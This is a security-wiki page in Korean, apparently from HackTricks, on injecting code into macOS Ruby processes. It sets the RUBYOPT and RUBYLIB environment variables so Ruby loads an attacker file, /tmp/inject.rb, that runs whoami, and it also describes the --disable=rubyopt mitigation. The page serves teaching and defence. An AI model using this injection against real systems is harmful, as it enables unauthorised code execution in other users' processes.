# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby는 script를 실행하기 전에 `RUBYOPT` environment variable에서 지원되는 command-line switch를 파싱합니다. Ruby는 `RUBYOPT`에서 `-e`를 통한 code execution을 거부하지만, `-I`는 library-search directory를 앞에 추가할 수 있고 `-r`은 library를 require할 수 있습니다. 따라서 attacker-controlled environment variables를 사용해 Ruby를 실행하는 process는 attacker-controlled Ruby code를 로드하도록 만들 수 있습니다.<sup>[[1]](#references)</sup>

`/tmp/inject.rb`를 생성합니다:
```ruby:inject.rb
puts `whoami`
```
`hello.rb`와 같은 benign Ruby script를 생성합니다:
```ruby:hello.rb
puts 'Hello, World!'
```
제어된 `RUBYOPT` 값으로 실행합니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
이 동작을 비활성화하려면 스크립트 이름 **앞에** `--disable=rubyopt`(또는 `--disable-rubyopt`)를 전달합니다:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` 뒤에 작성된 옵션은 `ARGV`를 통해 script에 전달되며, Ruby가 `RUBYOPT`를 먼저 처리하는 동작을 비활성화하지 않습니다.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

`RUBYOPT` 내부에서 `-I`를 사용해 load 디렉터리를 앞에 추가하는 대신, 별도의 `RUBYLIB` 환경 변수는 디렉터리를 Ruby의 `$LOAD_PATH`에 추가합니다. `RUBYOPT=-r<module>`과 결합하면 `RUBYOPT`에 `-I`를 지정하지 않아도 attacker code를 load할 수 있습니다:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby 문서 - Ruby 명령줄 옵션](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
